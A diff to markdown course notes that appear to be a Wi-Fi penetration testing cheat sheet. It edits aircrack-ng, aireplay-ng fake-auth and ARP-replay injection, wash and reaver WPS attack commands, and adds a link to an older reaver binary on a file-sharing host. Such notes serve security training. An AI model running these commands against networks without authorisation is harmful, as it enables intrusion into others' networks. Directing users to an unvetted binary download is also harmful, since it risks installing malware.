@@ -60,18 +60,20 @@ Here are the commands that will be used in the course
   * `aircrack-ng <network-file>`
 ### NOT Busy Network
 * Associate with the target network (tell the network that I wnat to connect to it)
-* Fake Auth
-  * `aireplay-ng --fakeauth 0 -a <network bssid> -h <your wireless adapter MAC> wlan0mon`
+* Fake Auth (Associate)
+  * `aireplay-ng --fakeauth 0 -a <network bssid> -h <wireless adapter MAC> wlan0mon`
 * Packet Injection
-  * `aireplay-ng --arpreplay -b <network bssid> -h <your wireless adapter MAC> wlan0mon`
+  * `aireplay-ng --arpreplay -b <network bssid> -h <wireless adapter MAC> wlan0mon`
 ## Crack WPA/WPA2
 ### With WPS
 * If wash is not working
   * `mkdir /etc/reaver`
 * Check if the network has WPS
   * `wash -i wlan0mon`
+* Associate with the target network with a delay of 30s
 * Attack
-  * `reaver -b <network bssid> -c <network channel> -i wlan0mon`
+  * `reaver -b <network bssid> -c <network channel> -i wlan0mon -vvv --no-associate`
+* If you get an error get an [older version of reaver](https://files.fm/u/z5ha7t93)
 ### Without WPS
 * Start airodump-ng in the target
 * Deauth a client to capture the WPA Hanshake
